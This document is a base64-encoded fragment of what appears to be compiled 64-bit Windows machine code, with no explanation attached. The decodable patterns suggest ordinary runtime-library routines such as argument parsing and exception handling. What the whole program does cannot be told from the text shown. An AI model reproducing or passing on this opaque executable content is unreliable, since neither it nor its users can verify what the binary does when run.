NI+OtBi0j46zyLQzBMAVsgwegEqAFIi0MgdAdID79I+OsjD7dI+Osdi0MwTAFbIMHoBKgBSItDIHQHSA++SPjrBA+2SPhEi0MwQYvAwegEqAF0EEiFyXkLSPfZQYPIQESJQzCDezgAfQnHQzgBAAAA6xGDYzD3uAACAAA5Qzh+A4lDOEiFyXUEg2Mw30WLwkk703UNSIvRSIvL6Czw///rCovRSIvL6ITv//+LQzDB6AeoAXQdg3tQAHQJSItLSIA5MHQOSP9LSEiLS0jGATD/Q1CwAUiDxCBbw8xIiVwkCEiJdCQQV0iD7CC7CAAAAEiL+UgBWSBIi0EgSItw+OhUPgAAhcB1F+gfJQAAxwAWAAAA6MQhAAAywOmIAAAAi088ugQAAACD+QV/LHQ+hcl0N4PpAXQag+kBdA6D6QF0KIP5AXQmM9vrIrsCAAAA6xu7AQAAAOsUg+kGdA+D6QF0CoPpAnQF69NIi9pIg+sBdCpIg+sBdBtIg+sCdA5IO9p1hUhjRyhIiQbrFYtHKIkG6w4Pt0coZokG6wWKTyiIDsZHQAGwAUiLXCQwSIt0JDhIg8QgX8PMSIlcJAhIiXQkEFdIg+wgSINBIAhIi9lIi0Egi3k4g///RItBPA+3UUJIi3D4uP///39IiXFID0T4SIsJ6PPt//+EwHQjSIX2SGPXSI0Nft4AAMZDVAFID0XOSIlLSOhdJwAAiUNQ60xIhfZ1C0iNBVDeAABIiUNITItDSEUzyYX/fi1BgDgAdCdIi0MIQQ+2EEiLCEiLAbkAgAAAZoUMUHQDSf/ASf/AQf/BRDvPfNNEiUtQSItcJDCwAUiLdCQ4SIPEIF/DzMxIiVwkEEiJbCQYVldBVkiD7DBFM/ZIi9lEOHFUD4WUAAAAi0FQhcAPjokAAABIi3FIQYv+TItLCEiNTCRQZkSJdCRQSIvWSYsBTGNACOi+IwAASGPohcB+V0iLg2gEAABED7dEJFCLSBTB6Qz2wQF0DUiLg2gEAABMOXAIdCBIi5NoBAAAQQ+3yOiOOgAAuf//AABmO8F1BoNLKP/rA/9DKEgD9f/HSIvFO3tQdYbrJ4NLKP/rIUiLQxBMjUkoRItDUEiBwWgEAABIi1NISIlEJCDoFQAAAEiLXCRYsAFIi2wkYEiDxDBBXl9ew0iJXCQQSIlsJBhIiXQkIFdBVkFXSIPsIEiLAUmL2UyL8kiL8USLUBRBweoMQfbCAXQSSIsBSIN4CAB1CEUBAemsAAAASIt8JGBJY8CLL4MnAEyNPEKJbCRASTvXD4SDAAAAvf//AABIiwZFD7cGi0gUwekM9sEBdApIiwZIg3gIAHQWSIsWQQ+3yOihOQAAZjvFdQWDC//rCf8DiwOD+P91NoM/KnU6SIsGi0gUwekM9sEBdApIiwZIg3gIAHQXSIsWuT8AAADoZDkAAGY7xXUFgwv/6wL/A0mDxgJNO/d1hotsJECDPwB1BoXtdAKJL0iLXCRISItsJFBIi3QkWEiDxCBBX0FeX8PMzMxAVUiL7EiD7GBIi0UwSIlFwEyJTRhMiUUoSIlVEEiJTSBIhdJ1FeiJIQAAxwAWAAAA6C4eAACDyP/rSk2FwHTmSI1FEEiJVchIiUXYTI1NyEiNRRhIiVXQSIlF4EyNRdhIjUUgSIlF6EiNVdBIjUUoSIlF8EiNTTBIjUXASIlF+OgD6v//SIPEYF3DzEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CCLBRXVAQAz278DAAAAhcB1B7gAAgAA6wU7xw9Mx0hjyLoIAAAAiQXw1AEA6AsUAAAzyUiJBerUAQDoBRMAAEg5Hd7UAQB1L7oIAAAAiT3J1AEASIvP6OETAAAzyUiJBcDUAQDo2xIAAEg5HbTUAQB1BYPI/+t1TIvzSI01O4sBAEiNLRyLAQBIjU0wRTPAuqAPAADoj0AAAEiLBYTUAQBIjRU91gEASIvLg+E/SMHhBkmJLAZIi8NIwfgGSIsEwkiLTAgoSIPBAkiD+QJ3BscG/v///0j/w0iDxVhJg8YISIPGWEiD7wF1njPASItcJDBIi2wkOEiLdCRASIt8JEhIg8QgQV7DzIvBSI0Nk4oBAEhrwFhIA8HDzMzMQFNIg+wg6E1EAADo0EIAADPbSIsN79MBAEiLDAvoJkUAAEiLBd/TAQBIiwwDSIPBMP8VEcsAAEiDwwhIg/sYddFIiw3A0wEA6NsRAABIgyWz0wEAAEiDxCBbw8xIg8EwSP8l0coAAMxIg8EwSP8lzcoAAMxIiQ2d0wEAw0iJXCQIV0iD7CBIi/noLgAAAEiL2EiFwHQZSIvI/xUhzAAASIvP/9OFwHQHuAEAAADrAjPASItcJDBIg8QgX8NAU0iD7CAzyegHRQAAkEiLHVeJAQCLy4PhP0gzHTvTAQBI08szyeg9RQAASIvDSIPEIFvD6XMRAADMzMxIi8RIiVgISIloEEiJcBhIiXggQVZIg+wgRTP2SIv6SCv5SIvZSIPHB0GL7kjB7wNIO8pJD0f+SIX/dB9IizNIhfZ0C0iLzv8Ve8sAAP/WSIPDCEj/xUg773XhSItcJDBIi2wkOEiLdCRASIt8JEhIg8QgQV7DzMxIiVwkCEiJdCQQV0iD7CBIi/JIi9lIO8p0IEiLO0iF/3QPSIvP/xUlywAA/9eFwHULSIPDCEg73uveM8BIi1wkMEiLdCQ4SIPEIF/D6WcQAADMzMy4Y3Nt4DvIdAMzwMOLyOkBAAAAzEiJXCQISIlsJBBIiXQkGFdIg+wgSIvyi/noiicAAEUzwEiL2EiFwHUHM8DpSAEAAEiLCEiLwUiNkcAAAABIO8p0DTk4dAxIg8AQSDvCdfNJi8BIhcB00kiLeAhIhf90yUiD/wV1DEyJQAiNR/zpBgEAAEiD/wEPhPkAAABIi2sISIlzCItwBIP+CA+F0AAAAEiDwTBIjZGQAAAA6whMiUEISIPBEEg7ynXzgTiNAADAi3MQD4SIAAAAgTiOAADAdHeBOI8AAMB0ZoE4kAAAwHRVgTiRAADAdESBOJIAAMB0M4E4kwAAwHQigTi0AgDAdBGBOLUCAMB1T8dDEI0AAADrRsdDEI4AAADrPcdDEIUAAADrNMdDEIoAAADrK8dDEIQAAADrIsdDEIEAAADrGcdDEIYAAADrEMdDEIMAAADrB8dDEIIAAABIi8//FZfJAACLUxC5CAAAAP/XiXMQ6xFIi89MiUAI/xV7yQAAi87/10iJawiDyP9Ii1wkMEiLbCQ4SIt0JEBIg8QgX8PMzMwzwIH5Y3Nt4A+UwMNIi8RIiVgISIlwEEiJeBhMiXAgQVdIg+wgQYvwi9pEi/FFhcB1SjPJ/xVGxwAASIXAdD25TVoAAGY5CHUzSGNIPEgDyIE5UEUAAHUkuAsCAABmOUEYdRmDuYQAAAAOdhA5sfgAAAB0CEGLzuhIAQAAuQIAAADo4kEAAJCAPTrQAQAAD4WyAAAAQb8BAAAAQYvHhwUV0AEAhdt1SEiLPRKGAQCL14PiP41LQCvKM8BI08hIM8dIiw35zwEASDvIdBpIM/mLykjTz0iLz/8Ve8gAAEUzwDPSM8n/10iNDQvRAQDrDEE733UNSI0NFdEBAOjgCgAAkIXbdRNIjRW8yAAASI0NlcgAAOh4/P//SI0VucgAAEiNDarIAADoZfz//w+2BZbPAQCF9kEPRMeIBYrPAQDrBujzDAAAkLkCAAAA6GxBAACF9nUJQYvO6BwAAADMSItcJDBIi3QkOEiLfCRATIt0JEhIg8QgQV/DQFNIg+wgi9noJz0AAITAdChlSIsEJWAAAACLkLwAAADB6gj2wgF1Ef8VisUAAEiLyIvT/xWHxQAAi8voDAAAAIvL/xVwxgAAzMzMzEiJXCQIV0iD7CBIg2QkOABMjUQkOIv5SI0V9tUAADPJ/xVOxgAAhcB0J0iLTCQ4SI0V9tUAAP8VGMYAAEiL2EiFwHQNSIvI/xVHxwAAi8//00iLTCQ4SIXJdAb/FevFAABIi1wkMEiDxCBfw0iJDYnOAQDDM9IzyUSNQgHpx/3//8zMzEUzwEGNUALpuP3//4sFXs4BAMPMSIvESIlYCEiJaBBIiXAYSIl4IEFUQVZBV0iD7CBMi3wkYE2L4UmL+EyL8kiL2UmDJwBJxwEBAAAASIXSdAdMiQJJg8YIQDLtgDsidQ9AhO1AtiJAD5TFSP/D6zdJ/wdIhf90B4oDiAdI/8cPvjNI/8OLzui0UAAAhcB0Ekn/B0iF/3QHigOIB0j/x0j/w0CE9nQcQITtdbBAgP4gdAZAgP4JdaRIhf90CcZH/wDrA0j/y0Ay9oA7AA+E0gAAAIA7IHQFgDsJdQVI/8Pr8YA7AA+EugAAAE2F9nQHSYk+SYPGCEn/BCS6AQAAADPA6wVI/8P/wIA7XHT2gDsidTGEwnUZQIT2dAuAewEidQVI/8PrCTPSQIT2QA+UxtHo6xD/yEiF/3QGxgdcSP/HSf8HhcB17IoDhMB0RECE9nUIPCB0OzwJdDeF0nQrSIX/dAWIB0j/xw++C+jQTwAAhcB0Ekn/B0j/w0iF/3QHigOIB0j/x0n/B0j/w+lp////SIX/dAbGBwBI/8dJ/wfpJf///02F9nQESYMmAEn/BCRIi1wkQEiLbCRISIt0JFBIi3wkWEiDxCBBX0FeQVzDQFNIg+wgSLj/////////H0yLykyL0Ug7yHIEM8DrPEiDyf8z0kiLwUn38Ew7yHPrScHiA00Pr8hJK8pJO8l220uNDBG6AQAAAOhSCwAAM8lIi9joUAoAAEiLw0iDxCBbw8zMzEiJXCQIVVZXQVZBV0iL7EiD7DCNQf9Ei/GD+AF2FujtFwAAvxYAAACJOOiRFAAA6S8BAADoy0oAAEiNHRTMAQBBuAQBAABIi9Mzyf8V88EAAEiLNZTVAQAz/0iJHZvVAQBIhfZ0BUA4PnUDSIvzSI1FSEiJfUBMjU1ASIlEJCBFM8BIiX1IM9JIi87oUP3//0yLfUBBuAEAAABIi1VISYvP6Pb+//9Ii9hIhcB1EehdFwAAjXsMiTgzyemfAAAATo0E+EiL00iNRUhIi85MjU1ASIlEJCDoBf3//0GD/gF1FItFQP/ISIkd79QBAIkF5dQBAOvDSI1VOEiJfThIi8vo+0IAAIvwhcB0GUiLTTjoMAkAAEiLy0iJfTjoJAkAAIv+6z9Ii1U4SIvPSIvCSDk6dAxIjUAISP/BSDk4dfSJDZPUAQAzyUiJfThIiRWK1AEA6O0IAABIi8tIiX046OEIAACLx0iLXCRgSIPEMEFfQV5fXl3DzMxIiVwkCFdIg+wgM/9IOT3RywEAdAQzwOtI6G5JAADorU0AAEiL2EiFwHUFg8//6ydIi8joNAAAAEiFwHUFg8//6w5IiQWzywEASIkFlMsBADPJ6HUIAABIi8vobQgAAIvHSItcJDBIg8QgX8NIiVwkCEiJbCQQSIl0JBhXQVZBV0iD7DAz9kyL8YvW6xo8PXQDSP/CSIPI/0j/wEA4NAF190j/wUgDyIoBhMB14EiNSgG6CAAAAOgJCQAASIvYSIXAdGxMi/hBODZ0YUiDzf9I/8VBODQudfdI/8VBgD49dDW6AQAAAEiLzejWCAAASIv4SIXAdCVNi8ZIi9VIi8joaAcAADPJhcB1SEmJP0mDxwjotgcAAEwD9eurSIvL6EUAAAAzyeiiBwAA6wNIi/MzyeiWBwAASItcJFBIi8ZIi3QkYEiLbCRYSIPEMEFfQV5fw0UzyUiJdCQgRTPAM9LoBBIAAMzMzMxIhcl0O0iJXCQIV0iD7CBIiwFIi9lIi/nrD0iLyOhCBwAASI1/CEiLB0iFwHXsSIvL6C4HAABIi1wkMEiDxCBfw8zMzEiD7ChIiwlIOw1CygEAdAXop////0iDxCjDzMxIg+woSIsJSDsNHsoBAHQF6Iv///9Ig8Qow8zMSIPsKEiNDfXJAQDouP///0iNDfHJAQDoyP///0iLDfXJAQDoXP///0iLDeHJAQBIg8Qo6Uz////p3/3//8zMzEiJXCQITIlMJCBXSIPsIEmL2UmL+IsK6DQ6AACQSIvP6LcBAACL+IsL6HY6AACLx0iLXCQwSIPEIF/DzEiJXCQISIl0JBBMiUwkIFdBVEFVQVZBV0iD7EBJi/lNi/iLCujrOQAAkEmLB0iLEEiF0nUJSIPL/+lAAQAASIs1J34BAESLxkGD4D9Ii/5IMzpBi8hI089IiXwkMEiL3kgzWghI08tIiVwkIEiNR/9Ig/j9D4f6AAAATIvnSIl8JChMi/NIiVwkOEG9QAAAAEGLzUEryDPASNPISDPGSIPrCEiJXCQgSDvfcgxIOQN1AuvrSDvfc0pIg8v/SDv7dA9Ii8/oowUAAEiLNZx9AQCLxoPgP0Qr6EGLzTPSSNPKSDPWSYsHSIsISIkRSYsHSIsISIlRCEmLB0iLCEiJURDrcovOg+E/SDMzSNPOSIkDSIvO/xXrvwAA/9ZJiwdIixBIizVEfQEARIvGQYPgP0yLzkwzCkGLyEnTyUiLQghIM8ZI08hNO8x1BUk7xnQgTYvhTIlMJChJi/lMiUwkMEyL8EiJRCQ4SIvYSIlEJCDpHP///0iLvCSIAAAAM9uLD+jjOAAAi8NIi1wkcEiLdCR4SIPEQEFfQV5BXUFcX8PMSIvESIlYCEiJaBBIiXAYSIl4IEFUQVZBV0iD7CBIiwEz9kyL+UiLGEiF23UIg8j/6YYBAABMiwWQfAEAQbxAAAAASIsrQYvITItLCIPhP0iLWxBJM+hNM8hI081JM9hJ08lI08tMO8sPhccAAABIK924AAIAAEjB+wNIO9hIi/tID0f4QY1EJOBIA/tID0T4SDv7ch9FjUQkyEiL10iLzegvSgAAM8lMi/DoHQQAAE2F9nUoSI17BEG4CAAAAEiL10iLzegLSgAAM8lMi/Do+QMAAE2F9g+EUf///0yLBel7AQBNjQzeQYvASY0c/oPgP0GLzCvISIvWSNPKSIvDSSvBSTPQSIPAB0mL7kjB6ANJi8lMO8tID0fGSIXAdBZI/8ZIiRFIjUkISDvwdfFMiwWXewEAQYvAQYvMg+A/K8hJi0cISIsQQYvESNPKSTPQTY1BCEmJEUiLFW57AQCLyoPhPyvBishJiwdI081IM+pIiwhIiSlBi8xIixVMewEAi8KD4D8ryEmLB0nTyEwzwkiLEEyJQghIixUuewEAi8KD4D9EK+BJiwdBisxI08tIM9pIiwgzwEiJWRBIi1wkQEiLbCRISIt0JFBIi3wkWEiDxCBBX0FeQVzDzMxIi9FIjQ0exgEA6X0AAADMTIvcSYlLCEiD7DhJjUMISYlD6E2NSxi4AgAAAE2NQ+hJjVMgiUQkUEmNSxCJRCRY6D/8//9Ig8Q4w8zMRTPJTIvBSIXJdQSDyP/DSItBEEg5AXUkSIsVhXoBALlAAAAAi8KD4D8ryEnTyUwzyk2JCE2JSAhNiUgQM8DDzEiJVCQQSIlMJAhVSIvsSIPsQEiNRRBIiUXoTI1NKEiNRRhIiUXwTI1F6LgCAAAASI1V4EiNTSCJRSiJReDoevv//0iDxEBdw0iNBZV7AQBIiQWexQEAsAHDzMzMSIPsKEiNDTXFAQDoVP///0iNDUHFAQDoSP///7ABSIPEKMPMsAHDzEiD7Cjo7/r//7ABSIPEKMNAU0iD7CBIixXDeQEAuUAAAACLwjPbg+A/K8hI08tIM9pIi8vocwsAAEiLy+jr7///SIvL6MNJAABIi8vol0wAAEiLy+j39P//sAFIg8QgW8PMzMwzyemlrf//zEBTSIPsIEiLDb9+AQCDyP/wD8EBg/gBdR9Iiw2sfgEASI0dfXwBAEg7y3QM6EMBAABIiR2UfgEASIsNrcQBAOgwAQAASIsNqcQBADPbSIkdmMQBAOgbAQAASIsNrMwBAEiJHY3EAQDoCAEAAEiLDaHMAQBIiR2SzAEA6PUAAACwAUiJHYzMAQBIg8QgW8PMzEiNFQ3LAABIjQ0WygAA6aFHAADMSIPsKOgfGAAASIXAD5XASIPEKMNIg+wo6DMXAACwAUiDxCjDSI0V1coAAEiNDd7JAADp/UcAAMxIg+wo6MMYAACwAUiDxCjDQFNIg+wg6EEXAABIi1gYSIXbdA1Ii8v/FQO7AAD/0+sA6AIBAACQzEBTSIPsIDPbSIXJdAxIhdJ0B02FwHUbiBnoDg4AALsWAAAAiRjosgoAAIvDSIPEIFvDTIvJTCvBQ4oECEGIAUn/wYTAdAZIg+oBdexIhdJ12YgZ6NQNAAC7IgAAAOvEzEiFyXQ3U0iD7CBMi8Ez0kiLDarLAQD/FWy5AACFwHUX6KcNAABIi9j/FZq4AACLyOjfDAAAiQNIg8QgW8PMzMxAU0iD7CBIi9lIg/ngdzxIhcm4AQAAAEgPRNjrFej2SgAAhcB0JUiLy+jm7f//hcB0GUiLDUfLAQBMi8Mz0v8VDLkAAEiFwHTU6w3oPA0AAMcADAAAADPASIPEIFvDzMxIg+wo6FNHAABIhcB0CrkWAAAA6JRHAAD2Bal4AQACdCm5FwAAAOiDpQAAhcB0B7kHAAAAzSlBuAEAAAC6FQAAQEGNSALohgcAALkDAAAA6JTy///MzMzMQFNIg+wgTIvCSIvZSIXJdA4z0kiNQuBI9/NJO8ByQ0kPr9i4AQAAAEiF20gPRNjrFegqSgAAhcB0KEiLy+ga7f//hcB0HEiLDXvKAQBMi8O6CAAAAP8VPbgAAEiFwHTR6w3obQwAAMcADAAAADPASIPEIFvDzMzM9sEEdAOwAcP2wQF0GYPhAnQIgfoAAACAd+uFyXUIgfr///9/d98ywMPMzMxIiVwkCEiJbCQYSIl0JCBXQVRBVUFWQVdIg+xQRTPtQYrxRYv4SIv6TDkqdSbo/gsAAMcAFgAAAOijCAAASItPCEiFyXQGSIsHSIkBM8DpYwYAAEWFwHQJQY1A/oP4InfMSIvRSI1MJCjoDtj//0yLJ0WL9UyJZCQgvQgAAABBD7ccJEmNRCQC6wpIiwcPtxhIg8ACi9VIiQcPt8voU0kAAIXAdeVAhPZBi+1AD5XFZoP7LXUFg80C6wZmg/srdQ1IiwcPtxhIg8ACSIkHvuYJAADHhCSIAAAAagYAAEGDyf+5YAYAAEG6MAAAAEG7EP8AALrwBgAAuGYKAABEjUaAQffH7////w+FfwIAAGZBO9oPgsoBAABmg/s6cwsPt8NBK8LptAEAAGZBO9sPg5UBAABmO9kPgqYBAABmO5wkiAAAAHMKD7fDK8HpjQEAAGY72g+CiQEAALn6BgAAZjvZcwoPt8MrwulwAQAAZkE72A+CawEAALlwCQAAZjvZcwsPt8NBK8DpUQEAAGY73g+CTQEAALnwCQAAZjvZcwoPt8Mrxuk0AQAAZjvYD4IwAQAAuHAKAABmO9hzDQ+3wy1mCgAA6RQBAAC55goAAGY72Q+CCwEAAI1BCmY72A+CY////41IdmY72Q+C8wAAAI1BCmY72A+CS////7lmDAAAZjvZD4LZAAAAjUEKZjvYD4Ix////jUh2ZjvZD4LBAAAAjUEKZjvYD4IZ////jUh2ZjvZD4KpAAAAjUEKZjvYD4IB////uVAOAABmO9kPgo8AAACNQQpmO9gPguf+//+NSHZmO9lye41BCmY72A+C0/7//41IRmY72XJnjUEKZjvYD4K//v//uUAQAABmO9lyUY1BCmY72A+Cqf7//7ngFwAAZjvZcjuNQQpmO9gPgpP+//+NSCZmO9lyJ41BCmY72HMf6X7+//+4Gv8AAGY72HMID7fDQSvD6wODyP+D+P91KY1Dv2aD+Bl2Do1Dn2aD+Bl2BUGLwesSjUOfZoP4GQ+3w3cDg+ggg8DJvggAAACFwHQLRYX/dXlEjX4C63NIiwdBuN//AAAPtxBIjUgCSIkPjUKoZkGFwHQ6RYX/RA9E/kiDwf5IiQ9mhdJ0RGY5EXQ/6NkIAADHABYAAADofgUAAEGDyf9BujAAAABBuxD/AADrHQ+3GbgQAAAARYX/RA9E+EiNQQJIiQfrBb4IAAAAM9JBi8FB9/dBvWAGAABBvPAGAABEi8BmQTvaD4KuAQAAZoP7OnMLD7fLQSvK6ZgBAABmQTvbD4N5AQAAZkE73Q+CiQEAALhqBgAAZjvYcwsPt8tBK83pbwEAAGZBO9wPgmoBAAC4+gYAAGY72HMLD7fLQSvM6VABAAC4ZgkAAGY72A+CRwEAAI1ICmY72XMKD7fLK8jpMAEAALjmCQAAZjvYD4InAQAAjUgKZjvZcuCNQXZmO9gPghMBAACNSApmO9lyzI1BdmY72A+C/wAAAI1ICmY72XK4jUF2ZjvYD4LrAAAAjUgKZjvZcqS4ZgwAAGY72A+C1QAAAI1ICmY72XKOjUF2ZjvYD4LBAAAAjUgKZjvZD4J2////jUF2ZjvYD4KpAAAAjUgKZjvZD4Je////uFAOAABmO9gPgo8AAACNSApmO9kPgkT///+NQXZmO9hye41ICmY72Q+CMP///41BRmY72HJnjUgKZjvZD4Ic////uEAQAABmO9hyUY1ICmY72Q+CBv///7jgFwAAZjvYcjuNSApmO9kPgvD+//+NQSZmO9hyJ41ICmY72XMf6dv+//+4Gv8AAGY72HMID7fLQSvL6wODyf+D+f91KY1Dv2aD+Bl2Do1Dn2aD+Bl2BUGLyesSjUOfD7fLZoP4GXcDg+kgg8HJQTvJdDBBO89zKwvuRTvwcgt1BDvKdgWDzQTrB0UPr/dEA/FIiwcPtxhIg8ACSIkH6er9//9Igwf+RTPtSIsHTItkJCBmhdt0FWY5GHQQ6FQGAADHABYAAADo+QIAAECE7nUfTIknRDhsJEAPhEP6//9Ii0QkKIOgqAMAAP3pMvr//0GL1ovN6L/5//+EwHRv6BIGAADHACIAAABA9sUBdQZBg87/62FA9sUCdClEOGwkQHQMSItEJCiDoKgDAAD9SItPCEiFyXQGSIsHSIkBuAAAAIDrV0Q4bCRAdAxIi0QkKIOgqAMAAP1Ii08ISIXJdAZIiwdIiQG4////f+suQPbFAnQDQffeRDhsJEB0DEiLTCQog6GoAwAA/UiLVwhIhdJ0BkiLD0iJCkGLxkyNXCRQSYtbMEmLa0BJi3NISYvjQV9BXkFdQVxfw0iJXCQQSIl0JBhVV0FWSI2sJBD7//9IgezwBQAASIsFbG8BAEgzxEiJheAEAABBi/iL8ovZg/n/dAXoGZj//zPSSI1MJHBBuJgAAADoD6T//zPSSI1NEEG40AQAAOj+o///SI1EJHBIiUQkSEiNTRBIjUUQSIlEJFD/FVmvAABMi7UIAQAASI1UJEBJi85FM8D/FUmvAABIhcB0NkiDZCQ4AEiNTCRgSItUJEBMi8hIiUwkME2LxkiNTCRYSIlMJChIjU0QSIlMJCAzyf8VFq8AAEiLhQgFAABIiYUIAQAASI2FCAUAAEiDwAiJdCRwSImFqAAAAEiLhQgFAABIiUWAiXwkdP8VNa8AADPJi/j/FeOuAABIjUwkSP8V0K4AAIXAdRCF/3UMg/v/dAeLy+gkl///SIuN4AQAAEgzzOhNiv//TI2cJPAFAABJi1soSYtzMEmL40FeX13DzEiJDZW5AQDDSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsMEGL+UmL8EiL6kyL8ehaDQAASIXAdEFIi5i4AwAASIXbdDVIi8v/FYCwAABEi89Mi8ZIi9VJi85Ii8NIi1wkQEiLbCRISIt0JFBIi3wkWEiDxDBBXkj/4EiLHbVtAQCLy0gzHRS5AQCD4T9I08tIhdt1sEiLRCRgRIvPTIvGSIlEJCBIi9VJi87oIgAAAMzMSIPsOEiDZCQgAEUzyUUzwDPSM8noP////0iDxDjDzMxIg+wouRcAAADopJsAAIXAdAe5BQAAAM0pQbgBAAAAuhcEAMBBjUgB6Kf9////FaGtAABIi8i6FwQAwEiDxChI/yWWrQAAzMxAU0iD7EBIY9mLBZW4AQCFwHRLM9JIjUwkIOgVz///SItEJCiDeAgBfhVMjUQkKLoEAAAAi8vo4UAAAIvQ6wpIiwAPtxRYg+IEgHwkOAB0HEiLRCQgg6CoAwAA/esOSIsFN24BAA+3FFiD4gSLwkiDxEBbw0iJXCQIV0iD7CBIY/lIhdJ0H0iLAoN4CAF+EUyLwovPugEAAADofkAAAOsRSIsA6wXo0j8AAA+3BHiD4AFIi1wkMIXAD5XASIPEIF/DzMzMSIlcJBBIiXQkIFVIi+xIg+xwSGPZSI1N4OhSzv//gfsAAQAAczhIjVXoi8vof////4TAdA9Ii0XoSIuIEAEAAA+2HBmAffgAD4TcAAAASItF4IOgqAMAAP3pzAAAADPAZolFEIhFEkiLReiDeAgBfiiL80iNVejB/ghAD7bO6OVAAACFwHQSQIh1ELkCAAAAiF0RxkUSAOsX6IYBAAC5AQAAAMcAKgAAAIhdEMZFEQBIi1XoTI1NEDPAx0QkQAEAAABmiUUgQbgAAQAAiEUii0IMSIuSOAEAAIlEJDhIjUUgx0QkMAMAAABIiUQkKIlMJCBIjU3o6AlEAACFwA+EQf///w+2XSCD+AEPhDT///8Ptk0hweMIC9mAffgAdAtIi03gg6GoAwAA/UyNXCRwi8NJi1sYSYtzKEmL413DzMxIg+woiwWWtgEAhcB0CzPS6Kv+//+LyOsLjUG/g/gZdwODwSCLwUiDxCjDzDPATI0NE70AAEmL0USNQAg7CnQr/8BJA9CD+C1y8o1B7YP4EXcGuA0AAADDgcFE////uBYAAACD+Q5BD0bAw0GLRMEEw8zMzEiJXCQIV0iD7CCL+ejrCQAASIXAdQlIjQX3awEA6wRIg8AkiTjo0gkAAEiNHd9rAQBIhcB0BEiNWCCLz+h3////iQNIi1wkMEiDxCBfw8zMSIPsKOijCQAASIXAdQlIjQWvawEA6wRIg8AkSIPEKMNIg+wo6IMJAABIhcB1CUiNBYtrAQDrBEiDwCBIg8Qow0iJEUyJQQhNhcB0A0mJEEiLwcPMQFNIg+wwQYvYTIvCSIvRSI1MJCDo0////0iL0EGxAUSLwzPJ6HPz//9Ig8QwW8PMSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsUEUz9kmL6EiL8kiL+UiF0nQTTYXAdA5EODJ1JkiFyXQEZkSJMTPASItcJGBIi2wkaEiLdCRwSIt8JHhIg8RQQV7DSYvRSI1MJDDogcv//0iLRCQ4TDmwOAEAAHUVSIX/dAYPtgZmiQe7AQAAAOmkAAAAD7YOSI1UJDjoST4AALsBAAAAhcB0UUiLTCQ4RItJCEQ7y34vQTvpfCqLSQyNUwhBi8ZIhf9Mi8YPlcCJRCQoSIl8JCD/FcypAABIi0wkOIXAdQ9IY0EISDvocjpEOHYBdDSLWQjrPUGLxkiF/0SLy0yLxg+VwLoJAAAAiUQkKEiLRCQ4SIl8JCCLSAz/FYSpAACFwHUO6Hf+//+Dy//HACoAAABEOHQkSHQMSItMJDCDoagDAAD9i8Pp9/7//0Uzyemw/v//SIlcJAhIiXQkGGZEiUwkIFdIg+xgSYv4SIvySIvZSIXSdRNNhcB0DkiFyXQCIREzwOmPAAAASIXJdAODCf9Jgfj///9/dhPoAP7//7sWAAAAiRjopPr//+tpSIuUJJAAAABIjUwkQOgsyv//SItEJEhIg7g4AQAAAHV5D7eEJIgAAAC5/wAAAGY7wXZKSIX2dBJIhf90DUyLxzPSSIvO6Kyc///oo/3//7sqAAAAiRiAfCRYAHQMSItMJECDoagDAAD9i8NMjVwkYEmLWxBJi3MgSYvjX8NIhfZ0C0iF/w+EiQAAAIgGSIXbdFXHAwEAAADrTYNkJHgASI1MJHhIiUwkOEyNhCSIAAAASINkJDAAQbkBAAAAi0gMM9KJfCQoSIl0JCD/FS2oAACFwHQZg3wkeAAPhWr///9Ihdt0AokDM9vpaP////8V+qcAAIP4eg+FTf///0iF9nQSSIX/dA1Mi8cz0kiLzujim///6Nn8//+7IgAAAIkY6H35///pLP///0iD7DhIg2QkIADobf7//0iDxDjDQFVIg+wgSI1sJCBIg+XgiwXrZgEATIvSTIvBg/gFD4zQAAAA9sEBdCtIjQRRSIvRSDvID4SoAQAARTPJZkQ5Cg+EmwEAAEiDwgJIO9B17emNAQAAg+EfuCAAAABIK8FI99lNG9tMI9hJ0etJO9NMD0LaRTPJSYvQS40EWEw7wHQPZkQ5CnQJSIPCAkg70HXxSSvQSNH6STvTD4VIAQAASYvKSY0UUEkry0iLwYPgH0gryMXsV9JMjRxK6xDF7XUKxf3XwYXAdQlIg8IgSTvTdetLjQRQ6wpmRDkKdAlIg8ICSDvQdfFJK9BI0frF+Hfp8wAAAIP4AQ+MxgAAAPbBAXQrSI0EUUiL0Ug7yA+EzwAAAEUzyWZEOQoPhMIAAABIg8ICSDvQde3ptAAAAIPhD7gQAAAASCvBSPfZTRvbTCPYSdHrSTvTTA9C2kUzyUmL0EuNBFhMO8B0D2ZEOQp0CUiDwgJIO9B18Ukr0EjR+kk703VzSYvKSY0UUEkryw9XyUiLwYPgD0gryEyNHErrFGYPb8FmD3UCZg/XwIXAdQlIg8IQSTvTdedLjQRQ6wpmRDkKdAlIg8ICSDvQdfFJK9DrIUiNBFFIi9FIO8h0EkUzyWZEOQp0CUiDwgJIO9B18Ugr0UjR+kiLwkiDxCBdw0iJXCQITIlMJCBXSIPsIEmL2UmL+IsK6IQgAACQSIsHSIsISIuJiAAAAEiFyXQeg8j/8A/BAYP4AXUSSI0F5mcBAEg7yHQG6Kzs//+QiwvooCAAAEiLXCQwSIPEIF/DzEiJXCQITIlMJCBXSIPsIEmL2UmL+IsK6CQgAACQSItHCEiLEEiLD0iLEkiLCeh+AgAAkIsL6FogAABIi1wkMEiDxCBfw8zMzEiJXCQITIlMJCBXSIPsIEmL2UmL+IsK6NwfAACQSIsHSIsISIuBiAAAAPD/AIsL6BggAABIi1wkMEiDxCBfw8xIiVwkCEyJTCQgV0iD7CBJi9lJi/iLCuicHwAAkEiLDzPSSIsJ6P4BAACQiwvo2h8AAEiLXCQwSIPEIF/DzMzMQFVIi+xIg+xQSIlN2EiNRdhIiUXoTI1NILoBAAAATI1F6LgFAAAAiUUgiUUoSI1F2EiJRfBIjUXgSIlF+LgEAAAAiUXQiUXUSI0FEa8BAEiJReCJUShIjQ2zswAASItF2EiJCEiNDZVmAQBIi0XYiZCoAwAASItF2EiJiIgAAACNSkJIi0XYSI1VKGaJiLwAAABIi0XYZomIwgEAAEiNTRhIi0XYSIOgoAMAAADozv7//0yNTdBMjUXwSI1V1EiNTRjocf7//0iDxFBdw8zMzEiFyXQaU0iD7CBIi9noDgAAAEiLy+jm6v//SIPEIFvDQFVIi+xIg+xASI1F6EiJTehIiUXwSI0VBLMAALgFAAAAiUUgiUUoSI1F6EiJRfi4BAAAAIlF4IlF5EiLAUg7wnQMSIvI6Jbq//9Ii03oSItJcOiJ6v//SItN6EiLSVjofOr//0iLTehIi0lg6G/q//9Ii03oSItJaOhi6v//SItN6EiLSUjoVer//0